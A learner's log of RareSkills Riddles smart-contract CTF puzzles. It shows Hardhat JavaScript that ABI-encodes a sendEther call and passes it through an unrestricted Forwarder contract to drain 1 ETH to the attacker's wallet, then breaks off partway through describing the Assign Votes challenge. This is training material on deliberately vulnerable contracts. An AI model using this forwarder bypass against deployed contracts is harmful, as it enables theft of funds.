## Day 13: Business logic errors (and ABI encoding Prerequisite)

### RareSkills Riddles: Forwarder

The objective of this attack is to get the attacker's wallet to be near 1 Eth in value.  This appears to be a test of using call() and delegatecall().  The Wallet's sendEther function expects to be called by the Forwarder contract.  

```Java
    function sendEther(address destination, uint256 amount) public {
        require(msg.sender == forwarder, "sender must be forwarder contract");
        (bool success, ) = destination.call{value: amount}("");
        require(success, "failed");
    }
```

The Hardhat test code to make this call is given below.  The hardest part was encoding in JavaScript.  

```Javascript
    it("conduct your attack here", async function () {
      // forwarder contract needs to call functionCall(walletContract.address, bytes)
      // set up abi.encodeWithSignature in JS
      let ABI = ["constructor(address _forwarder)",
        "function sendEther(address destination, uint256 amount)",];
      let iface = new ethers.utils.Interface(ABI);
      let encodedShit = iface.encodeFunctionData("sendEther", [attackerWallet.address, ethers.utils.parseEther("1")]);

      await forwarderContract.connect(attackerWallet).functionCall(walletContract.address, encodedShit);
    });
```

The code above simply has the forwarderContract forward the ```sendEther()``` call to the Wall contract.  


### RareSkills Riddles: Assign Votes

The objective here is to drain the victimContract in one transaction.  The contract can create proposals and addresses can vote on these proposals if they have been assigned.  Each address can vote 

Each proposal has a value, a target address and data that will be called if the number of votes is over 9.  

